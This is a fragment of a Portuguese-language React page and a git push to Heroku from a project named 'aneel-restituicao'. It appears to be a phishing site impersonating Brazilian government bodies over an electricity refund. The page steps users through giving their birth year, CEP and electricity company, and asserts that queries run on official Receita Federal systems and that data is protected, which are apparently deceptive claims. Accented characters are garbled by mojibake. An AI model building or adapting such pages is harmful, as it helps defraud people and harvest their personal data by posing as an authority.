                        Agora, selecione sua data de nascimento entre as op├º├Áes abaixo:
                      </h2>

                      <Form {...anoForm}>
                        <form onSubmit={anoForm.handleSubmit(onSubmitAno)} className="space-y-4">
                          <FormField
                            control={anoForm.control}
                            name="ano"
                            render={({ field }) => (
                              <FormItem className="space-y-4">
                                <FormControl>
                                  <RadioGroup
                                    onValueChange={field.onChange}
                                    value={field.value}
                                    className="space-y-3"
                                  >
                                    {opcoesAno.map((ano, index) => (
                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
                                        <RadioGroupItem value={ano} id={`ano-${index}`} />
                                        <Label htmlFor={`ano-${index}`} className="flex-1 cursor-pointer">
                                          {ano}
                                        </Label>
                                      </div>
                                    ))}
                                  </RadioGroup>
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <div className="text-center mt-6">
                            <Button
                              type="submit"
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                              disabled={isLoading || !anoForm.watch("ano")}
                            >
                              <span>Prosseguir</span>
                              <ArrowRight className="ml-2 h-5 w-5" />
                            </Button>
                          </div>
                        </form>
                      </Form>
                    </div>
                  )}

                  {etapaAtual === EtapaVerificacao.CEP_ALTERNATIVO && (
                    <div>
                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
                        Por favor, informe seu CEP para identificarmos sua regi├úo:
                      </h2>

                      <Form {...cepForm}>
                        <form onSubmit={cepForm.handleSubmit(onSubmitCep)} className="space-y-4">
                          <FormField
                            control={cepForm.control}
                            name="cep"
                            render={({ field }) => (
                              <FormItem>
                                <FormLabel>CEP</FormLabel>
                                <FormControl>
                                  <Input
                                    placeholder="Digite seu CEP (ex: 12345-678)"
                                    {...field}
                                    className="h-12"
                                    maxLength={9}
                                    onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
                                      // Formatar o CEP automaticamente (12345-678)
                                      let value = e.target.value.replace(/\D/g, '');
                                      if (value.length > 5) {
                                        value = value.substring(0, 5) + '-' + value.substring(5);
                                      }
                                      field.onChange(value);
                                    }}
                                  />
                                </FormControl>
                                <FormDescription>
                                  Informe o CEP completo com 8 d├¡gitos.
                                </FormDescription>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <div className="text-center mt-6">
                            <Button
                              type="submit"
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                              disabled={isLoading || !cepForm.watch("cep") || cepForm.watch("cep").length < 8}
                            >
                              {isLoading ? (
                                <>
                                  <span>Consultando CEP...</span>
                                  <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                                </>
                              ) : (
                                <>
                                  <span>Consultar CEP</span>
                                  <SearchIcon className="ml-2 h-5 w-5" />
                                </>
                              )}
                            </Button>

                            <Button
                              type="button"
                              variant="outline"
                              className="mt-3 w-full py-3"
                              onClick={() => setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA)}
                              disabled={isLoading}
                            >
                              Voltar para a sele├º├úo de companhia
                            </Button>
                          </div>
                        </form>
                      </Form>
                    </div>
                  )}

                  {etapaAtual === EtapaVerificacao.COMPANHIA_ELETRICA && (
                    <div>
                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
                        Agora, selecione a sua companhia el├®trica entre as op├º├Áes abaixo:
                      </h2>

                      <Form {...companhiaForm}>
                        <form onSubmit={companhiaForm.handleSubmit(onSubmitCompanhia)} className="space-y-4">
                          <FormField
                            control={companhiaForm.control}
                            name="companhia"
                            render={({ field }) => (
                              <FormItem className="space-y-4">
                                <FormControl>
                                  <RadioGroup
                                    onValueChange={field.onChange}
                                    value={field.value}
                                    className="space-y-3"
                                  >
                                    {opcoesCompanhia.map((companhia, index) => (
                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
                                        <RadioGroupItem value={companhia} id={`companhia-${index}`} />
                                        <Label htmlFor={`companhia-${index}`} className="flex-1 cursor-pointer">
                                          {companhia}
                                        </Label>
                                      </div>
                                    ))}
                                    <div className="flex items-center space-x-2 border p-3 rounded-md">
                                      <RadioGroupItem value="nenhuma_das_opcoes" id="companhia-nenhuma" />
                                      <Label htmlFor="companhia-nenhuma" className="flex-1 cursor-pointer">
                                        Nenhuma das op├º├Áes
                                      </Label>
                                    </div>
                                  </RadioGroup>
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <div className="text-center mt-6">
                            <Button
                              type="submit"
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                              disabled={isLoading || !companhiaForm.watch("companhia")}
                            >
                              <span>Prosseguir</span>
                              <ArrowRight className="ml-2 h-5 w-5" />
                            </Button>
                          </div>
                        </form>
                      </Form>
                    </div>
                  )}

                  {/* Requisitos de seguran├ºa */}
                  <div className="mt-8 bg-[var(--gov-gray-light)] p-4 rounded-md border border-[var(--gov-gray)]">
                    <h3 className="text-[var(--gov-blue-dark)] font-semibold mb-2">Informa├º├Áes de Seguran├ºa:</h3>
                    <ul className="text-sm text-[var(--gov-gray-dark)] space-y-2">
                      <li>ÔÇó Seus dados s├úo protegidos e criptografados.</li>
                      <li>ÔÇó A consulta ├® feita nos sistemas oficiais da Receita Federal.</li>
                      <li>ÔÇó ├ë necess├írio confirmar sua identidade para prosseguir.</li>
                      <li>ÔÇó N├úo compartilhamos seus dados com terceiros.</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git push heroku main
Everything up-to-date

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>